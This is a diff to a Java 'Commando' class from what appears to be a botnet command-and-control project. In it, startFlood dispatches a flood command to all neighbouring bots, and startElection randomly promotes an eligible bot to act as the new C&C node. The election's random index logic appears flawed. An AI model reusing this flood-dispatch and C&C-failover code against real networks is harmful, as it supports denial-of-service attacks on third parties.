@@ -34,6 +34,7 @@ import cs.sii.domain.Pairs;
 import cs.sii.domain.SyncIpList;
 import cs.sii.model.bot.Bot;
 import cs.sii.model.user.User;
+import cs.sii.network.request.BotRequest;
 import cs.sii.network.request.CecRequest;
 import cs.sii.service.connection.NetworkService;
 import cs.sii.service.crypto.CryptoPKI;
@@ -49,8 +50,11 @@ public class Commando {
 	private Auth auth;
 
 	@Autowired
-	private CecRequest req;
+	private CecRequest ccReq;
 
+	@Autowired
+	private BotRequest bReq;
+	
 	@Autowired
 	private BotServiceImpl bServ;
 	
@@ -323,25 +327,27 @@ public class Commando {
 
 	public void startFlood(String msg) {
 		nServ.getNeighbours().getList().forEach((pairs) -> {
-			req.sendFloodToBot(pairs.getValue1().toString(), msg);
+			ccReq.sendFloodToBot(pairs.getValue1().toString(), msg);
 		});
 	}
 
 	@Async //forse inutile perche siamo sul thread nostro
 	public void startElection() {
 		List<Bot> botList = bServ.findAll();
-		List<Bot> ccList = new ArrayList<>();
+	
+		List<String> ccList = new ArrayList<>();
 		if (botList!=null){
 			for (Bot bot : botList) {
 				if(bot.isElegible().equals("true"))
-					ccList.add(bot);
+					ccList.add(bot.getIp());
 			}
-			Bot botB = ccList.get((int) Math.ceil(Math.random()*ccList.size()));
-			System.out.println("ho eletto "+botB.getIp());
-			if(req.becameCc(botB.getIp())){
-				newKing = botB.getIp();
+			System.out.println(ccList.remove(nServ.getMyIp().toString()));
+			String ip = ccList.get((int) Math.ceil(Math.random()*(ccList.size()-1)));
+			System.out.println("ho eletto "+ip);
+			if(ccReq.becameCc(ip)){
+				newKing = ip;
 			}
-			
+			System.out.println("erection completed ");
 		//elegilo passa i dati
 		// passa il potere	
 		}
@@ -393,6 +399,14 @@ public class Commando {
 
 	public void setGraph(UndirectedGraph<IP, DefaultEdge> graph) {
 		this.graph = graph;
+	}
+
+	public BotRequest getbReq() {
+		return bReq;
+	}
+
+	public void setbReq(BotRequest bReq) {
+		this.bReq = bReq;
 	}
 
 }
